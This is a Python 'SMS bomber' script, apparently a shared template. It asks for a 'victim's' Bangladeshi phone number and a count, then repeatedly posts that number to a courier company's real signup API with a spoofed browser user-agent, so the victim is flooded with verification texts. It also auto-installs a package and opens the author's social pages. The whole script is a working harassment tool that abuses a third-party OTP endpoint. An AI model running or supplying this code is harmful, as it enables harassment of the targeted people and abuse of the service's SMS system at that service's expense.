#This Tool Make By MR.MIVI
#Github > MIVI404cyber
# Follow My Github

import os,requests,time
try:
	import rajx
except ModuleNotFoundError:
	os.system("pip install rajx")
import rajx
from rajx import line

os.system("clear")
os.system("xdg-open https://github.com/MIVI404cyber")
os.system("xdg-open EXAMPLE_FB_ID_LINK")
def Logo():
    rajx.ost("clear")
    baner= os.system("figlet -f slant LOGO_NAME")
    baner = str(baner)
    baner = baner.replace("0","")
    rajx.p(f"{rajx.GREEN}")
    rajx.p(baner)
    rajx.line()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] AUTHOR    :\033[1;92m EXAMPLE_NAME ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] WHATSAPP  : EX_WHATSAPP")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] FACEBOOK  : FB_ID_NAME ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] GITHUB    : GITHUB_NAME ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] VERSION   : EX_VERSION ")
    rajx.line()
Logo()
num=input(f""" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] Input Victims Number {rajx.RED}>> {rajx.YELLOW}+88{rajx.GREEN} """)
rajx.line()
amount=int(input(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] Sms Sent Limit {rajx.RED}>>{rajx.GREEN} "))
rajx.line()

data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  send1=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send1.status_code==200:
    ses+=1
    rajx.p(f"\n {rajx.WHITE}[{rajx.GREEN}{ses}{rajx.WHITE}]{rajx.GREEN} SHORT_NAME Sms sent Successfully")
  else:pass
  send2=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send2.status_code==200:
    ses+=1
    rajx.p(f"\n {rajx.WHITE}[{rajx.CYAN}{ses}{rajx.WHITE}]{rajx.CYAN} SHORT_NAME Sms sent Successfully")
  else:pass

rajx.ost("clear")
baner= os.system("figlet -f slant SENT DONE")
baner = str(baner)
baner = baner.replace("0","")
rajx.p(f"{rajx.CYAN}")
rajx.p(baner)
exit()